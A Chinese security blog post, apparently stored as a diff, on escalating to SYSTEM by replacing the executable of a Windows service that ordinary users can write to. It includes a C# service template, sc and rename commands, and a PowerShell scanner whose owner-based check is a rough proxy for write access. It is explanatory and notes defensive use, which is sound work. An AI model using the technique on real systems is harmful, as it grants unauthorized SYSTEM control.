@@ -1,0 +1,349 @@
+I"�:<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>从DidierStevens的博客学到了一些技巧，本文将要对其中涉及到的技巧进行测试总结，并开源一个powershell脚本，用来寻找可被替换的服务，实现自动化利用。</p>
+
+<p>DidierStevens的博客链接：</p>
+
+<p>https://blog.didierstevens.com/2017/09/05/abusing-a-writable-windows-service/</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>使用c#编写可供Windows服务调用的程序</li>
+  <li>psexec的-i参数使用技巧</li>
+  <li>sc命令使用技巧</li>
+  <li>通过powershell获取服务对应的可执行文件路径</li>
+  <li>自动化利用脚本开发细节</li>
+</ul>
+
+<h2 id="0x02-使用c编写可供windows服务调用的程序">0x02 使用c#编写可供Windows服务调用的程序</h2>
+<hr />
+
+<p>可供Windows服务调用的程序需要能够同SCM(Services Control Manager)进行交互，所以在程序编写上需要注意</p>
+
+<p>Didier Stevens在博客中给出了c#开发的模板，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.ServiceProcess;
+ 
+namespace Demo
+{
+    public class Service : ServiceBase
+    {
+        protected override void OnStart(string[] args)
+        {
+            System.Diagnostics.Process.Start("cmd.exe");
+        }
+    }
+ 
+    static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } }
+}
+</code></pre></div></div>
+
+<p>由于是c#代码，可以直接用csc.exe进行编译</p>
+
+<p>所以在实际使用的过程，不需要提前编译好exe，只需要将cs脚本上传，再使用csc.exe编译成exe即可</p>
+
+<h2 id="0x03-sc命令使用技巧">0x03 sc命令使用技巧</h2>
+<hr />
+
+<p>查询所有服务列表：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc query  
+</code></pre></div></div>
+
+<p>查询指定服务配置信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc qc 服务名 
+</code></pre></div></div>
+
+<p>创建服务：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create Test type= own binpath= c:\test\test.exe
+</code></pre></div></div>
+
+<p>删除服务：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc delete 服务名
+</code></pre></div></div>
+
+<h2 id="0x04-通过powershell获取服务对应的可执行文件路径">0x04 通过powershell获取服务对应的可执行文件路径</h2>
+<hr />
+
+<p>Didier Stevens在博客中说他朋友找到了一个可写的Windows服务，并且只需要普通用户权限，于是，自然就想到了我们自己能否也找到这个服务</p>
+
+<p>通过sc query能够列举出所有服务名称，再通过sc qc 服务名 查询到该服务对应的可执行文件路径</p>
+
+<p>例如：<code class="language-plaintext highlighter-rouge">sc qc eventlog</code></p>
+
+<p>如下图，eventlog服务对应可执行文件路径为<code class="language-plaintext highlighter-rouge">C:\Windows\System32\svchost.exe</code></p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-1.png" alt="Alt text" /></p>
+
+<p>可以手动去查找每个服务对应的可执行文件路径，看是否存在符合要求的路径（即普通用户可写的权限）</p>
+
+<p>当然，该过程耗时耗力，最好通过编写程序来实现</p>
+
+<p>在Windows系统下，最简单高效的开发语言还是powershell，于是决定使用powershell来实现自动化判断</p>
+
+<p>但是，sc这个命令不能直接在ps里面运行，ps会把它当作set-content的别名</p>
+
+<p><strong>注：</strong></p>
+
+<p>可通过使用sc.exe在ps里面运行sc命令,例如<code class="language-plaintext highlighter-rouge">sc.exe qc eventlog</code></p>
+
+<p><strong>解决方法：</strong></p>
+
+<p>调用WMI来实现，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject win32_service | select Name,PathName
+</code></pre></div></div>
+
+<p>如下图，能够列举服务和对应的可执行文件路径</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-2.png" alt="Alt text" /></p>
+
+<h2 id="0x05-自动化利用脚本开发细节">0x05 自动化利用脚本开发细节</h2>
+<hr />
+
+<p>下面介绍自动化脚本的开发细节，思路如下：</p>
+
+<p>列举出服务和对应的可执行文件路径后，对每一个路径进行提取，判断该路径是否具有普通用户可写的权限</p>
+
+<h3 id="1获取所有可执行文件路径">1、获取所有可执行文件路径</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject win32_service | select Name,PathName
+</code></pre></div></div>
+
+<h3 id="2将可执行文件路径转换为数组">2、将可执行文件路径转换为数组</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$out = (Get-WmiObject win32_service | select PathName)
+$out|% {[array]$global:path += $_.PathName}
+</code></pre></div></div>
+
+<p>数组范围：</p>
+
+<p><code class="language-plaintext highlighter-rouge">$out[0]</code>至<code class="language-plaintext highlighter-rouge">$out[($out.Count-1)]</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-3.png" alt="Alt text" /></p>
+
+<h3 id="3截取路径显示单个数组的文件夹">3、截取路径,显示单个数组的文件夹</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$out[0].PathName.Substring($out[0].PathName.IndexOfAny("C"),$out[0].PathName.LastIndexOfAny("\"))
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-4.png" alt="Alt text" /></p>
+
+<h3 id="4为了格式统一将字符串都转换为大写">4、为了格式统一，将字符串都转换为大写</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$out[0].PathName.ToUpper().Substring($out[0].PathName.ToUpper().IndexOfAny("C"),$out[0].PathName.ToUpper().LastIndexOfAny("\"))
+</code></pre></div></div>
+
+<h3 id="5枚举所有截取过的文件夹">5、枚举所有截取过的文件夹</h3>
+
+<p>使用foreach循环：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foreach ($item in $out) 
+{
+	$item.PathName.ToUpper().Substring($item.PathName.ToUpper().IndexOfAny("C"),$item.PathName.ToUpper().LastIndexOfAny("\"))
+}
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-5.png" alt="Alt text" /></p>
+
+<p>也可使用for循环：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for($i=0;$i -le $out.Count-1;$i++)
+{
+    $out[$i].PathName.ToUpper().Substring($out[$i].PathName.ToUpper().IndexOfAny("C"),$out[$i].PathName.ToUpper().LastIndexOfAny("\"))
+}
+</code></pre></div></div>
+
+<h3 id="6获取文件夹权限">6、获取文件夹权限</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$a=$out[$i].PathName.ToUpper().Substring($out[$i].PathName.ToUpper().IndexOfAny("C"),$out[$i].PathName.ToUpper().LastIndexOfAny("\"))
+Get-Acl -Path $a |select Owner
+</code></pre></div></div>
+
+<p>以下三个权限代表管理员权限，不符合要求：</p>
+
+<ul>
+  <li>NT AUTHORITY\SYSTEM</li>
+  <li>NT SERVICE\TrustedInstaller</li>
+  <li>BUILTIN\Administrators</li>
+</ul>
+
+<p>因此要对其剔除,剩下的权限代表当前用户，对应代码为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If($a.Owner -ne "NT AUTHORITY\SYSTEM"){
+	If($a.Owner -ne "NT SERVICE\TrustedInstaller"){
+		If($a.Owner -ne "BUILTIN\Administrators"){
+			$a.Owner	
+		}	
+	}
+}
+</code></pre></div></div>
+
+<h3 id="7筛选符合条件的服务后重新查找找到当前用户权限对应的服务名称和路径">7、筛选符合条件的服务后，重新查找，找到当前用户权限对应的服务名称和路径</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject win32_service | ?{$_.PathName -like $out[$i].PathName}|select Name,PathName
+</code></pre></div></div>
+
+<h3 id="8如果在系统未找到可利用的服务脚本会报错提示不能对-null-值表达式调用方法">8、如果在系统未找到可利用的服务，脚本会报错，提示不能对 Null 值表达式调用方法</h3>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-6.png" alt="Alt text" /></p>
+
+<p>使用<code class="language-plaintext highlighter-rouge">$ErrorActionPreference="SilentlyContinue"</code>隐藏错误信息，错误信息写入<code class="language-plaintext highlighter-rouge">$Error</code>变量</p>
+
+<p>综上，对输出格式进行优化，完整代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ErrorActionPreference="SilentlyContinue"
+$out = (Get-WmiObject win32_service | select PathName)
+$out|% {[array]$global:path += $_.PathName}
+for($i=0;$i -le $out.Count-1;$i++)
+{
+    $a=Get-Acl -Path $out[$i].PathName.ToUpper().Substring($out[$i].PathName.ToUpper().IndexOfAny("C"),$out[$i].PathName.ToUpper().LastIndexOfAny("\"))
+ 	If($a.Owner -ne "NT AUTHORITY\SYSTEM"){
+		If($a.Owner -ne "NT SERVICE\TrustedInstaller"){
+			If($a.Owner -ne "BUILTIN\Administrators"){				
+				Get-WmiObject win32_service | ?{$_.PathName -like $out[$i].PathName}|select Name,PathName,ProcessId,StartMode,State,Status
+				Write-host Owner: $a.Owner
+			}	
+		}
+    }
+}
+Write-host [+] All done.
+</code></pre></div></div>
+
+<h2 id="0x06-实际测试">0x06 实际测试</h2>
+<hr />
+
+<h3 id="1手动创建服务test">1、手动创建服务Test</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create Test type= own binpath= c:\test\test.exe
+</code></pre></div></div>
+
+<h3 id="2编译生成exe">2、编译生成exe</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.ServiceProcess;
+namespace Demo
+{
+    public class Service : ServiceBase
+    {
+        protected override void OnStart(string[] args)
+        {
+            System.Diagnostics.Process.Start("calc.exe");
+        }
+    }
+    static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } }
+}
+</code></pre></div></div>
+
+<p>保存为test.cs</p>
+
+<p>使用csc.exe编译：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe test.cs
+</code></pre></div></div>
+
+<p>生成test.exe</p>
+
+<h3 id="3启动服务">3、启动服务</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc start Test
+</code></pre></div></div>
+
+<p>查看进程，能够看到calc.exe进程启动，权限为system，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/3-1.png" alt="Alt text" /></p>
+
+<h3 id="4替换testexe">4、替换test.exe</h3>
+
+<p>在实际情况，如果没有获得管理员权限，那么无法启动和停止服务</p>
+
+<p>如果不停止服务，就无法直接删除exe，提示拒绝访问</p>
+
+<p>但可以将该文件重命名，相当于变相删除该文件，将新文件再命名为test.exe</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rename test.exe test2.exe
+</code></pre></div></div>
+
+<p>这样就可以在不停止服务的情况下实现文件替换，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/3-2.png" alt="Alt text" /></p>
+
+<h3 id="5重启服务">5、重启服务</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop Test
+sc start Test
+</code></pre></div></div>
+
+<p>当然，该操作需要管理员权限</p>
+
+<h3 id="6psexec的-i参数使用技巧">6、psexec的-i参数使用技巧</h3>
+
+<p>由于服务启动的exe为system权限，默认为session 0，而用户界面为session 1，所以看不到启动的exe界面</p>
+
+<p>可通过psexec指定启动exe的session，这样就能获取到程序界面</p>
+
+<p>test.cs修改如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.ServiceProcess;
+namespace Demo
+{
+    public class Service : ServiceBase
+    {
+        protected override void OnStart(string[] args)
+        {
+            System.Diagnostics.Process.Start(@"c:\test\psexec.exe", @"-accepteula -d -i 1 calc.exe");
+        }
+    }
+    static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } }
+}
+</code></pre></div></div>
+
+<p>停止服务： <code class="language-plaintext highlighter-rouge">sc stop Test</code></p>
+
+<p>删除文件： <code class="language-plaintext highlighter-rouge">del test.exe</code></p>
+
+<p>编译文件： <code class="language-plaintext highlighter-rouge">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe test.cs</code></p>
+
+<p>将psexec保存在c:\test</p>
+
+<p>启动服务： <code class="language-plaintext highlighter-rouge">sc start Test</code></p>
+
+<p>此时，能够看到system权限calc.exe的界面，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/3-3.png" alt="Alt text" /></p>
+
+<h3 id="7使用powershell脚本扫描">7、使用powershell脚本扫描</h3>
+
+<p>如下图，标记出服务命令和可供替换的路径，便于进行替换</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/3-4.png" alt="Alt text" /></p>
+
+<p>该脚本能够自动判断当前系统是否存在可供利用的服务</p>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr />
+
+<p>如果找到了一个普通用户权限可写的Windows服务，对其可执行文件进行替换，那么在服务重启后，就能以system权限执行替换后的文件，可用作提权。</p>
+
+<p>本文开源的脚本可用来自动查找当前系统是否存在普通用户权限可写的Windows服务，站在防御者的角度，也可以用该脚本测试自己的系统。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
